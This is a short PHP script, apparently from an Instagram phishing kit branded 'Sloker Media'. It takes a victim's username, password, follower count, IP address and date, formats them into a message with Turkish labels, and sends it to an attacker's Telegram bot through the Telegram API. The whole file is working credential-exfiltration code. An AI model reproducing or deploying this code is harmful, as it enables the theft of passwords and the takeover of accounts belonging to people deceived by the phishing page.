<?php
include 'tokenandchatid.php';
    $data = [
        'text' => ' 
Sloker Media

Kullanıcı Adı : '.$username.'
Şifre : '.$slokerpass.'
Takipçi : '.$takipci.'
ip : '.$ip.'
Tarih : '.$tarih.'
Link : https://instagram.com/'.$username.'
      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>